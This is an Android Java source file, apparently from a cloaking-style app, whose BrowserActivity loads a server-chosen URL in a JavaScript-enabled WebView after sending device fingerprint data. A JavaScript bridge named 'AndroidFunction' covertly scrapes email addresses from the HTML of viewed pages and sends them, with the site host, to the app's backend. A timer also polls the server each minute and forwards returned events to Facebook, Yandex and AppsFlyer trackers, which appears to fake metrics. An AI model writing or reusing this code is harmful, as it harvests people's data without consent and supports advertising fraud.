package aaa.bbb.ccc.solidsnake.ui.activity;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.SharedPreferences;
import android.content.res.Configuration;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.WindowManager;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.widget.ProgressBar;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.facebook.applinks.AppLinkData;

import java.util.Arrays;
import java.util.Calendar;
import java.util.Hashtable;
import java.util.List;
import java.util.Map;
import java.util.TimeZone;
import java.util.Timer;
import java.util.TimerTask;

import aaa.bbb.ccc.solidsnake.R;
import aaa.bbb.ccc.solidsnake.data.JavaScriptInterface;
import aaa.bbb.ccc.solidsnake.data.WebClient;
import aaa.bbb.ccc.solidsnake.data.api.RestApi;
import aaa.bbb.ccc.solidsnake.data.api.RestService;
import aaa.bbb.ccc.solidsnake.data.metricaSender.AppsFlyerMetricSender;
import aaa.bbb.ccc.solidsnake.data.metricaSender.FacebookMetricSender;
import aaa.bbb.ccc.solidsnake.data.metricaSender.IMetricEventSender;
import aaa.bbb.ccc.solidsnake.data.metricaSender.YandexMetricSender;
import aaa.bbb.ccc.solidsnake.model.ServerResult;
import aaa.bbb.ccc.solidsnake.model.UserEvent;
import aaa.bbb.ccc.solidsnake.utils.Constants;
import aaa.bbb.ccc.solidsnake.utils.EmailParser;
import aaa.bbb.ccc.solidsnake.utils.Logger;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

import static aaa.bbb.ccc.solidsnake.ui.broadcastReceiver.InstallReferrerReceiver.REFERRER_DATA;

public class BrowserActivity extends AppCompatActivity {
    private List<IMetricEventSender> senders;
    private WebView webView;
    private Integer userId;
    private RestApi api;
    private Timer mTimer;
    private SharedPreferences sp;

    private TimerTask metricSender = new TimerTask() {
        @Override
        public void run() {
            api.getUserEvent(userId).enqueue(new Callback<List<UserEvent>>() {
                @Override
                public void onResponse(@NonNull Call<List<UserEvent>> call, @NonNull Response<List<UserEvent>> response) {
                    if (response.isSuccessful()) {
                        sendEvents(response.body());
                    }
                }

                @Override
                public void onFailure(@NonNull Call<List<UserEvent>> call, @NonNull Throwable t) {
                    Logger.log(t.getMessage());
                }
            });
        }
    };

    private void sendEvents(List<UserEvent> body) {
        for (UserEvent event : body) {
            for (IMetricEventSender sender : senders) {
                sender.sendEvent(event);
            }
        }
    }

    Callback<ServerResult> serverResultCallback = new Callback<ServerResult>() {
        @Override
        public void onResponse(@NonNull Call<ServerResult> call, @NonNull Response<ServerResult> response) {
            if (response.isSuccessful()) {
                String url = response.body().getResult();
                userId = response.body().getId();
                Logger.log(url);
                BrowserActivity.this.openWebPage(url);
                BrowserActivity.this.sendUserSClick(url);
                BrowserActivity.this.sendMetric();
            } else {
                close(Activity.RESULT_OK);
            }
        }

        @Override
        public void onFailure(@NonNull Call<ServerResult> call, Throwable t) {
            String htmlData = getString(R.string.error_internet_connection);
            webView.loadDataWithBaseURL(null, htmlData, "text/html", "UTF-8", null);
            Logger.log(t.getMessage());
        }
    };

    private void close(Integer id) {
        if (mTimer != null) {
            mTimer.cancel();
        }
        setResult(id);
        finish();
    }


    private void sendMetric() {
        mTimer = new Timer();
        mTimer.schedule(metricSender, 0, 1000 * 60);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_browser);
        senders = Arrays.asList(
                new FacebookMetricSender(getApplicationContext()),
                new YandexMetricSender(),
                new AppsFlyerMetricSender(getApplicationContext()));
        sp = getSharedPreferences(Constants.SHARED_PREF, MODE_PRIVATE);
        showStatusBar(isPortrait());
        initWebView();
        api = RestService.getInstance(getString(R.string.base_url));
        AppLinkData.fetchDeferredAppLinkData(this, new AppLinkData.CompletionHandler() {
            @Override
            public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {
                Map<String, String> query = getFieldMap(appLinkData);
                Call<ServerResult> call = api.getSereverUrl(query);
                call.enqueue(serverResultCallback);
            }
        });

    }

    private Map<String, String> getFieldMap(AppLinkData appLinkData) {
        Map<String, String> query = new Hashtable<>();
        String referrer = (appLinkData != null && appLinkData.getTargetUri() != null) ? appLinkData.getTargetUri().toString() : sp.getString(REFERRER_DATA, getString(R.string.base_ref));
        Long time = Calendar.getInstance(TimeZone.getDefault()).getTimeInMillis();
        query.put(Constants.ID_USER, "");
        query.put(Constants.APP_NAME, getPackageName());
        query.put(Constants.COUNTRY, getUserCountry());
        query.put(Constants.REFERRER, referrer);
        query.put(Constants.OS_VERSION, Build.VERSION.RELEASE);
        query.put(Constants.TIME_ZONE, time.toString());
        query.put(Constants.DEVICE_MODEL, Build.MODEL);
        return query;
    }

    private String getUserCountry() {
        return getResources().getConfiguration().locale.getCountry();
    }

    @Override
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        showStatusBar(isPortrait());
    }

    @Override
    public void onBackPressed() {
        Logger.log("onBackPressed");
        if (webView.canGoBack()) {
            webView.goBack();
            Logger.log("onBackPressed can gou back");
        } else {
            super.onBackPressed();
            Logger.log("don't onBackPressed");
            close(Activity.RESULT_CANCELED);
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void initWebView() {
        ProgressBar progressBar = findViewById(R.id.progress_bar);
        CookieSyncManager.createInstance(this);
        webView = findViewById(R.id.web_view);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.clearCache(true);
        webView.clearSslPreferences();

        webView.setWebViewClient(new WebClient(CookieManager.getInstance(), progressBar));
        webView.setWebChromeClient(new WebChromeClient());
        webView.addJavascriptInterface(new JavaScriptInterface() {
            @JavascriptInterface
            @Override
            public void showHTML(String html) {
                List<String> emails = new EmailParser(BrowserActivity.this).pars(html);
                sendEmails(emails, webView.getUrl());
            }
        }, "AndroidFunction");
    }

    private void sendEmails(List<String> emails, String addres) {
        String host = Uri.parse(addres).getHost();
        for (String email : emails) {
            api.sendEmail(userId, host, email).enqueue(new Callback<Void>() {
                @Override
                public void onResponse(Call<Void> call, Response<Void> response) {
                    Logger.log("email send success");
                }

                @Override
                public void onFailure(Call<Void> call, Throwable t) {
                    Logger.log("email don't send");
                }
            });
        }
    }

    private Boolean isPortrait() {
        return getResources().getConfiguration().orientation == Configuration.ORIENTATION_PORTRAIT;
    }

    private void showStatusBar(Boolean showStatusBar) {
        if (showStatusBar) {
            getWindow().clearFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
        } else {
            getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
        }
    }

    private void openWebPage(String url) {
        webView.loadUrl(url);
    }

    private void sendUserSClick(final String url) {
        String sclick = Uri.parse(url).getQueryParameter(Constants.SCLICK);
        api.sendUserSClick(userId, sclick).enqueue(new Callback<Void>() {
            @Override
            public void onResponse(@NonNull Call<Void> call, @NonNull Response<Void> response) {
                Logger.log(url + "send success");
            }

            @Override
            public void onFailure(@NonNull Call<Void> call, @NonNull Throwable t) {
                Logger.log(url + "send error");
            }
        });
    }
}